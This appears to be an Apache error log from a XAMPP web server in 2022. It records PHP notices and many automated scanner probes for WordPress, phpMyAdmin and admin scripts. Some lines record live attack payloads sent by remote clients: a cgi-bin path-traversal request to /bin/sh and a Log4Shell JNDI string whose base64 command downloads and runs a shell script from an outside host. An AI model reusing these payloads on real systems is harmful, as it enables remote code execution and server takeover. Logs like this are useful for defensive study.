+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file name. already exists.
+Error occurred while processing: name..
+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file name. already exists.
+Error occurred while processing: name..
+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file name. already exists.
+Error occurred while processing: name..
+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file name. already exists.
+Error occurred while processing: name..
+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file name. already exists.
+Error occurred while processing: name..
+A subdirectory or file c:\your already exists.
+Error occurred while processing: c:\your.
+A subdirectory or file name. already exists.
+Error occurred while processing: name..
+[Sun Feb 13 22:15:53.640369 2022] [php7:notice] [pid 2356:tid 1504] [client 23.95.100.141:59228] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Sun Feb 13 22:15:53.640369 2022] [php7:notice] [pid 2356:tid 1504] [client 23.95.100.141:59228] PHP Stack trace:
+[Sun Feb 13 22:15:53.640369 2022] [php7:notice] [pid 2356:tid 1504] [client 23.95.100.141:59228] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Sun Feb 13 22:54:49.362597 2022] [php7:notice] [pid 2356:tid 1504] [client 5.188.206.62:49686] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Sun Feb 13 22:54:49.362597 2022] [php7:notice] [pid 2356:tid 1504] [client 5.188.206.62:49686] PHP Stack trace:
+[Sun Feb 13 22:54:49.362597 2022] [php7:notice] [pid 2356:tid 1504] [client 5.188.206.62:49686] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Sun Feb 13 23:35:33.955540 2022] [php7:error] [pid 2356:tid 1532] [client 91.134.248.249:47122] script 'C:/xampp/htdocs/jindex.php' not found or unable to stat, referer: http://simplesite.com
+[Mon Feb 14 03:43:27.101020 2022] [php7:error] [pid 2356:tid 1504] [client 206.189.85.155:42164] script 'C:/xampp/htdocs/wp-2019.php' not found or unable to stat, referer: http://simplesite.com
+[Mon Feb 14 03:43:31.521494 2022] [php7:error] [pid 2356:tid 1504] [client 206.189.85.155:43006] script 'C:/xampp/htdocs/wp-2019.php' not found or unable to stat, referer: http://simplesite.com
+[Mon Feb 14 06:00:07.084092 2022] [core:error] [pid 2356:tid 1532] [client 45.146.165.37:54336] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Mon Feb 14 08:01:15.065937 2022] [php7:error] [pid 2356:tid 1532] [client 132.148.222.253:57739] script 'C:/xampp/htdocs/media-admin.php' not found or unable to stat, referer: http://simplesite.com
+[Mon Feb 14 11:39:13.044470 2022] [php7:error] [pid 2356:tid 1532] [client 167.86.118.188:56750] script 'C:/xampp/htdocs/phpinfo.php' not found or unable to stat
+[Mon Feb 14 11:39:14.559299 2022] [php7:error] [pid 2356:tid 1532] [client 167.86.118.188:57458] script 'C:/xampp/htdocs/info.php' not found or unable to stat
+[Mon Feb 14 11:39:17.480617 2022] [php7:error] [pid 2356:tid 1532] [client 167.86.118.188:58744] script 'C:/xampp/htdocs/phpinfo.php' not found or unable to stat
+[Mon Feb 14 11:39:19.698202 2022] [php7:error] [pid 2356:tid 1532] [client 167.86.118.188:59472] script 'C:/xampp/htdocs/info.php' not found or unable to stat
+[Mon Feb 14 12:27:04.931583 2022] [php7:error] [pid 2356:tid 1504] [client 185.232.22.211:61002] script 'C:/xampp/htdocs/test6956.php' not found or unable to stat
+[Mon Feb 14 14:29:32.761877 2022] [php7:error] [pid 2356:tid 1504] [client 103.74.118.242:35072] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Mon Feb 14 17:09:11.281422 2022] [php7:error] [pid 2356:tid 1516] [client 89.46.62.71:56522] script 'C:/xampp/phpMyAdmin/main.php' not found or unable to stat
+[Mon Feb 14 17:09:13.748798 2022] [php7:error] [pid 2356:tid 1516] [client 89.46.62.71:56577] script 'C:/xampp/phpMyAdmin/read_dump.phpmain.php' not found or unable to stat
+[Mon Feb 14 17:19:42.194570 2022] [php7:error] [pid 2356:tid 1516] [client 35.211.94.153:33188] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Mon Feb 14 17:39:31.205965 2022] [php7:error] [pid 2356:tid 1512] [client 64.235.231.20:51024] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Mon Feb 14 18:14:14.432319 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.108.139:50629] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:14:14.432319 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.108.139:50629] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:14:14.432319 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.108.139:50629] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:14:14.432319 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.108.139:50629] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:14:14.432319 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.108.139:50629] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:14:14.432319 2022] [php7:notice] [pid 2356:tid 1532] [client 174.7.108.139:50629] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\deleteCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP Warning:  Cookie names cannot contain any of the following '=,; \\t\\r\\n\\013\\014' in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 12, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:24.071295 2022] [php7:notice] [pid 2356:tid 1528] [client 174.7.108.139:50630] PHP   2. setcookie() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:12, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:38.255503 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.108.139:50631] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:38.255503 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.108.139:50631] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:38.255503 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.108.139:50631] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:38.255503 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.108.139:50631] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:38.255503 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.108.139:50631] PHP Stack trace:, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:14:38.255503 2022] [php7:notice] [pid 2356:tid 1520] [client 174.7.108.139:50631] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/index.php
+[Mon Feb 14 18:17:52.280399 2022] [php7:notice] [pid 2356:tid 1504] [client 174.7.108.139:50663] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:17:52.280399 2022] [php7:notice] [pid 2356:tid 1504] [client 174.7.108.139:50663] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:17:52.280399 2022] [php7:notice] [pid 2356:tid 1504] [client 174.7.108.139:50663] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:17:52.280399 2022] [php7:notice] [pid 2356:tid 1504] [client 174.7.108.139:50663] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:17:52.280399 2022] [php7:notice] [pid 2356:tid 1504] [client 174.7.108.139:50663] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 14 18:17:52.280399 2022] [php7:notice] [pid 2356:tid 1504] [client 174.7.108.139:50663] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 14 19:19:54.504431 2022] [php7:error] [pid 2356:tid 1512] [client 5.188.210.227:31214] script 'C:/xampp/htdocs/echo.php' not found or unable to stat, referer: https://www.google.com/
+[Mon Feb 14 20:20:11.332951 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.108.139:51591] PHP Warning:  include(C:/xampp/htdocs/bcit/demo/header.php): failed to open stream: No such file or directory in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 14 20:20:11.332951 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.108.139:51591] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 14 20:20:11.332951 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.108.139:51591] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 14 20:20:11.332951 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.108.139:51591] PHP Warning:  include(): Failed opening 'C:/xampp/htdocs/bcit/demo/header.php' for inclusion (include_path='C:\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php on line 3, referer: http://bcit.stevenover.land/
+[Mon Feb 14 20:20:11.332951 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.108.139:51591] PHP Stack trace:, referer: http://bcit.stevenover.land/
+[Mon Feb 14 20:20:11.332951 2022] [php7:notice] [pid 2356:tid 1500] [client 174.7.108.139:51591] PHP   1. {main}() C:\\xampp\\htdocs\\bcit\\tools\\setCookie.php:0, referer: http://bcit.stevenover.land/
+[Mon Feb 14 22:48:45.921227 2022] [php7:error] [pid 2356:tid 1524] [client 92.53.96.150:33956] script 'C:/xampp/htdocs/radio.php' not found or unable to stat
+[Tue Feb 15 01:49:42.118476 2022] [php7:error] [pid 2356:tid 1516] [client 88.214.28.132:55674] script 'C:/xampp/htdocs/media-admin.php' not found or unable to stat, referer: http://simplesite.com
+[Tue Feb 15 02:09:09.004390 2022] [core:error] [pid 2356:tid 1516] [client 45.146.165.37:44834] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Tue Feb 15 02:42:04.993331 2022] [php7:error] [pid 2356:tid 1516] [client 46.242.145.20:59376] script 'C:/xampp/htdocs/admin.php' not found or unable to stat, referer: http://simplesite.com
+[Tue Feb 15 05:00:00.910425 2022] [php7:notice] [pid 2356:tid 1516] [client 50.116.16.97:61900] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Tue Feb 15 05:00:00.910425 2022] [php7:notice] [pid 2356:tid 1516] [client 50.116.16.97:61900] PHP Stack trace:
+[Tue Feb 15 05:00:00.910425 2022] [php7:notice] [pid 2356:tid 1516] [client 50.116.16.97:61900] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Tue Feb 15 05:12:34.766137 2022] [php7:notice] [pid 2356:tid 1516] [client 50.116.16.97:35714] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Tue Feb 15 05:12:34.766137 2022] [php7:notice] [pid 2356:tid 1516] [client 50.116.16.97:35714] PHP Stack trace:
+[Tue Feb 15 05:12:34.766137 2022] [php7:notice] [pid 2356:tid 1516] [client 50.116.16.97:35714] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Tue Feb 15 06:31:39.503586 2022] [cgi:error] [pid 2356:tid 1504] [client 83.143.86.62:33200] AH02811: script not found or unable to stat: C:/xampp/cgi-bin/check_auth.cgi
+[Tue Feb 15 06:31:40.396815 2022] [cgi:error] [pid 2356:tid 1504] [client 83.143.86.62:35600] AH02811: script not found or unable to stat: C:/xampp/cgi-bin/login.cgi
+[Tue Feb 15 06:31:40.709201 2022] [cgi:error] [pid 2356:tid 1504] [client 83.143.86.62:36916] AH02811: script not found or unable to stat: C:/xampp/cgi-bin/main.cgi
+[Tue Feb 15 06:31:41.365212 2022] [cgi:error] [pid 2356:tid 1504] [client 83.143.86.62:38030] AH02811: script not found or unable to stat: C:/xampp/cgi-bin/index.html
+[Tue Feb 15 07:23:53.695998 2022] [php7:error] [pid 2356:tid 1504] [client 149.28.150.203:44004] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Tue Feb 15 07:39:37.720660 2022] [php7:notice] [pid 2356:tid 1504] [client 23.95.100.141:59584] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Tue Feb 15 07:39:37.720660 2022] [php7:notice] [pid 2356:tid 1504] [client 23.95.100.141:59584] PHP Stack trace:
+[Tue Feb 15 07:39:37.720660 2022] [php7:notice] [pid 2356:tid 1504] [client 23.95.100.141:59584] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Tue Feb 15 08:26:39.492845 2022] [php7:error] [pid 2356:tid 1516] [client 107.180.109.59:25600] script 'C:/xampp/htdocs/old-index.php' not found or unable to stat
+[Tue Feb 15 08:26:39.492845 2022] [php7:error] [pid 2356:tid 1504] [client 107.180.109.59:25602] script 'C:/xampp/htdocs/class-wp-widget-archives.php' not found or unable to stat
+[Tue Feb 15 08:26:39.492845 2022] [php7:error] [pid 2356:tid 1524] [client 107.180.109.59:25604] script 'C:/xampp/htdocs/1index.php' not found or unable to stat
+[Tue Feb 15 08:26:39.524083 2022] [php7:error] [pid 2356:tid 1500] [client 107.180.109.59:25606] script 'C:/xampp/htdocs/2index.php' not found or unable to stat
+[Tue Feb 15 08:26:39.571917 2022] [php7:error] [pid 2356:tid 1516] [client 107.180.109.59:25600] script 'C:/xampp/htdocs/1index.php' not found or unable to stat
+[Tue Feb 15 08:26:39.571917 2022] [php7:error] [pid 2356:tid 1504] [client 107.180.109.59:25602] script 'C:/xampp/htdocs/2index.php' not found or unable to stat
+[Tue Feb 15 08:26:39.571917 2022] [php7:error] [pid 2356:tid 1524] [client 107.180.109.59:25604] script 'C:/xampp/htdocs/3index.php' not found or unable to stat
+[Tue Feb 15 08:26:39.618774 2022] [php7:error] [pid 2356:tid 1500] [client 107.180.109.59:25606] script 'C:/xampp/htdocs/wikindex.php' not found or unable to stat
+[Tue Feb 15 08:26:39.618774 2022] [php7:error] [pid 2356:tid 1532] [client 107.180.109.59:25624] script 'C:/xampp/htdocs/admin.php' not found or unable to stat
+[Tue Feb 15 08:44:46.965978 2022] [php7:error] [pid 2356:tid 1512] [client 186.234.80.147:49706] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Tue Feb 15 09:40:40.462885 2022] [php7:error] [pid 2356:tid 1512] [client 176.235.216.155:33672] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Tue Feb 15 16:08:25.823532 2022] [php7:notice] [pid 2356:tid 1512] [client 185.173.35.9:61305] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Tue Feb 15 16:08:25.823532 2022] [php7:notice] [pid 2356:tid 1512] [client 185.173.35.9:61305] PHP Stack trace:
+[Tue Feb 15 16:08:25.823532 2022] [php7:notice] [pid 2356:tid 1512] [client 185.173.35.9:61305] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Tue Feb 15 19:43:30.423469 2022] [php7:notice] [pid 2356:tid 1504] [client 178.73.215.171:17056] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Tue Feb 15 19:43:30.423469 2022] [php7:notice] [pid 2356:tid 1504] [client 178.73.215.171:17056] PHP Stack trace:
+[Tue Feb 15 19:43:30.423469 2022] [php7:notice] [pid 2356:tid 1504] [client 178.73.215.171:17056] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Tue Feb 15 21:38:48.738332 2022] [php7:error] [pid 2356:tid 1532] [client 167.99.118.196:41968] script 'C:/xampp/htdocs/old-index.php' not found or unable to stat, referer: stevenover.land
+[Tue Feb 15 21:38:57.176658 2022] [php7:error] [pid 2356:tid 1532] [client 167.99.118.196:42794] script 'C:/xampp/htdocs/wp-load.php' not found or unable to stat, referer: stevenover.land
+[Tue Feb 15 23:11:24.798614 2022] [core:error] [pid 2356:tid 1532] [client 45.146.165.37:58590] AH00126: Invalid URI in request POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+[Wed Feb 16 05:37:08.446466 2022] [php7:notice] [pid 2356:tid 1508] [client 47.253.47.24:51648] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 16 05:37:08.446466 2022] [php7:notice] [pid 2356:tid 1508] [client 47.253.47.24:51648] PHP Stack trace:
+[Wed Feb 16 05:37:08.446466 2022] [php7:notice] [pid 2356:tid 1508] [client 47.253.47.24:51648] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Wed Feb 16 05:39:32.831535 2022] [php7:notice] [pid 2356:tid 1508] [client 47.253.47.24:53048] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 16 05:39:32.831535 2022] [php7:notice] [pid 2356:tid 1508] [client 47.253.47.24:53048] PHP Stack trace:
+[Wed Feb 16 05:39:32.831535 2022] [php7:notice] [pid 2356:tid 1508] [client 47.253.47.24:53048] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Wed Feb 16 19:27:23.259987 2022] [php7:error] [pid 2356:tid 1496] [client 202.88.97.132:42817] script 'C:/xampp/phpMyAdmin/main.php' not found or unable to stat
+[Wed Feb 16 19:27:44.038981 2022] [php7:error] [pid 2356:tid 1496] [client 202.88.97.132:42892] script 'C:/xampp/phpMyAdmin/read_dump.phpmain.php' not found or unable to stat
+[Wed Feb 16 19:52:56.009036 2022] [cgi:error] [pid 2356:tid 1496] [client 120.85.93.102:10387] AH02811: script not found or unable to stat: C:/xampp/htdocs/setup.cgi
+[Wed Feb 16 22:48:00.199225 2022] [php7:error] [pid 2356:tid 1496] [client 141.94.87.67:43642] script 'C:/xampp/htdocs/contents.php' not found or unable to stat, referer: http://simplesite.com
+[Wed Feb 16 23:36:48.001763 2022] [php7:notice] [pid 2356:tid 1520] [client 23.95.100.141:57188] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Wed Feb 16 23:36:48.001763 2022] [php7:notice] [pid 2356:tid 1520] [client 23.95.100.141:57188] PHP Stack trace:
+[Wed Feb 16 23:36:48.001763 2022] [php7:notice] [pid 2356:tid 1520] [client 23.95.100.141:57188] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Thu Feb 17 02:19:37.938241 2022] [core:error] [pid 2356:tid 1476] [client 128.1.248.42:52820] AH00126: Invalid URI in request HEAD /icons/.%2e/%2e%2e/apache2/icons/sphere1.png HTTP/1.1
+[Thu Feb 17 02:55:02.754550 2022] [php7:notice] [pid 2356:tid 1492] [client 23.95.100.141:37850] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Thu Feb 17 02:55:02.754550 2022] [php7:notice] [pid 2356:tid 1492] [client 23.95.100.141:37850] PHP Stack trace:
+[Thu Feb 17 02:55:02.754550 2022] [php7:notice] [pid 2356:tid 1492] [client 23.95.100.141:37850] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Thu Feb 17 06:22:32.693892 2022] [negotiation:error] [pid 2356:tid 1528] [client 130.255.166.195:11367] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 17 06:22:33.052798 2022] [negotiation:error] [pid 2356:tid 1528] [client 130.255.166.219:37861] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 17 06:22:33.458517 2022] [negotiation:error] [pid 2356:tid 1528] [client 130.255.166.146:51855] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 17 06:58:29.300261 2022] [php7:error] [pid 2356:tid 1528] [client 86.57.254.101:17759] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Thu Feb 17 08:51:01.023091 2022] [php7:notice] [pid 2356:tid 1528] [client 134.209.21.99:42940] PHP Notice:  Undefined index: HTTP_HOST in C:\\xampp\\htdocs\\index.php on line 7
+[Thu Feb 17 08:51:01.038690 2022] [php7:notice] [pid 2356:tid 1528] [client 134.209.21.99:42940] PHP Stack trace:
+[Thu Feb 17 08:51:01.038690 2022] [php7:notice] [pid 2356:tid 1528] [client 134.209.21.99:42940] PHP   1. {main}() C:\\xampp\\htdocs\\index.php:0
+[Thu Feb 17 08:51:01.397465 2022] [php7:error] [pid 2356:tid 1528] [client 134.209.21.99:43202] script 'C:/xampp/htdocs/system_api.php' not found or unable to stat
+[Thu Feb 17 09:15:16.060980 2022] [php7:error] [pid 2356:tid 1528] [client 91.227.16.16:42044] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Thu Feb 17 09:42:41.202754 2022] [php7:error] [pid 2356:tid 1528] [client 184.168.113.203:52567] script 'C:/xampp/htdocs/wp-login.php' not found or unable to stat
+[Thu Feb 17 11:58:03.472349 2022] [php7:error] [pid 2356:tid 1528] [client 89.248.168.215:32852] script 'C:/xampp/htdocs/setup.php' not found or unable to stat
+[Thu Feb 17 11:58:12.159372 2022] [php7:error] [pid 2356:tid 1528] [client 89.248.168.215:48626] script 'C:/xampp/phpMyAdmin/config.user.inc.php' not found or unable to stat
+[Thu Feb 17 12:59:11.157371 2022] [php7:error] [pid 2356:tid 1476] [client 87.236.22.53:56586] script 'C:/xampp/htdocs/2index.php' not found or unable to stat
+[Thu Feb 17 12:59:12.609714 2022] [php7:error] [pid 2356:tid 1476] [client 87.236.22.53:56896] script 'C:/xampp/htdocs/wp-mail.php' not found or unable to stat
+[Thu Feb 17 12:59:13.311988 2022] [php7:error] [pid 2356:tid 1476] [client 87.236.22.53:57072] script 'C:/xampp/htdocs/xmlrpc.php' not found or unable to stat
+[Thu Feb 17 12:59:14.014263 2022] [php7:error] [pid 2356:tid 1476] [client 87.236.22.53:57232] script 'C:/xampp/htdocs/load.php' not found or unable to stat
+[Thu Feb 17 17:34:47.205420 2022] [negotiation:error] [pid 2356:tid 1516] [client 130.255.166.151:64679] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 17 17:34:47.579952 2022] [negotiation:error] [pid 2356:tid 1516] [client 130.255.166.219:58075] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 17 17:34:47.938879 2022] [negotiation:error] [pid 2356:tid 1516] [client 130.255.166.151:40973] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_NOT_FOUND.html.var
+[Thu Feb 17 21:38:05.404026 2022] [core:error] [pid 2356:tid 1508] (20024)The given path is misformatted or contained invalid characters: [client 159.65.244.223:60060] AH00127: Cannot map GET /:80:undefined HTTP/1.1 to file, referer: t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//167.172.246.16:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovL3ZhbGxleXNjYW5uZXIuZHVja2Rucy5vcmcvc3NoZC5zaDsgY3VybCAtTyBodHRwOi8vdmFsbGV5c2Nhbm5lci5kdWNrZG5zLm9yZy9zc2hkLnNoOyBjaG1vZCA3Nzcgc3NoZC5zaDsgc2ggc3NoZC5zaA==}')
+[Fri Feb 18 01:37:14.701069 2022] [negotiation:error] [pid 2356:tid 1532] [client 61.219.11.151:62304] AH00690: no acceptable variant: C:/xampp/apache/error/HTTP_BAD_REQUEST.html.var
+[Fri Feb 18 05:35:56.633042 2022] [php7:error] [pid 2356:tid 1516] [client 5.56.58.29:37666] script 'C:/xampp/htdocs/admin.php' not found or unable to stat, referer: stevenover.land
+[Fri Feb 18 05:36:26.631097 2022] [php7:error] [pid 2356:tid 1516] [client 5.56.58.29:44000] script 'C:/xampp/htdocs/3index.php' not found or unable to stat, referer: stevenover.land
+[Mon Oct 24 11:42:37.010766 2022] [ssl:warn] [pid 1952:tid 256] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wiki/] does not exist
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wp] does not exist
+[Mon Oct 24 11:42:37.073262 2022] [core:warn] [pid 1952:tid 256] AH00098: pid file C:/xampp/apache/logs/httpd.pid overwritten -- Unclean shutdown of previous Apache run?
+[Mon Oct 24 11:42:37.073262 2022] [ssl:warn] [pid 1952:tid 256] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Mon Oct 24 11:42:38.385687 2022] [mpm_winnt:notice] [pid 1952:tid 256] AH00455: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.11 configured -- resuming normal operations
+[Mon Oct 24 11:42:38.385687 2022] [mpm_winnt:notice] [pid 1952:tid 256] AH00456: Apache Lounge VC15 Server built: Aug 11 2019 12:20:04
+[Mon Oct 24 11:42:38.385687 2022] [core:notice] [pid 1952:tid 256] AH00094: Command line: 'apache\\bin\\httpd.exe -d C:/xampp/apache -f conf\\httpd.conf'
+[Mon Oct 24 11:42:38.385687 2022] [mpm_winnt:notice] [pid 1952:tid 256] AH00418: Parent: Created child process 2584
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wiki/] does not exist
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wp] does not exist
+[Mon Oct 24 11:42:38.557552 2022] [ssl:warn] [pid 2584:tid 268] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wiki/] does not exist
+AH00112: Warning: DocumentRoot [C:/xampp/htdocs/wp] does not exist
+[Mon Oct 24 11:42:38.573176 2022] [ssl:warn] [pid 2584:tid 268] AH01909: www.example.com:443:0 server certificate does NOT include an ID which matches the server name
+[Mon Oct 24 11:42:38.604424 2022] [mpm_winnt:notice] [pid 2584:tid 268] AH00354: Child: Starting 150 worker threads.
